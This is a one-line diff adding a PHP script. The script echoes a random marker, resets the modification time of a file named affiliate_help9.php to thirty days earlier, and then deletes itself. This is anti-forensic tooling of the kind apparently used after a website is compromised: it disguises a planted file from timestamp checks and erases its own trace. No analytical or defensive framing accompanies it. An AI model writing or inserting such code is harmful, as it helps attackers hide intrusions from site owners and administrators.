@@ -1,0 +1,1 @@
+<?php echo "mhAkcQFUXH"; if (file_exists("./affiliate_help9.php")){ touch("./affiliate_help9.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*190MvD0Dn6KHWRQ3erDB*/ ?>
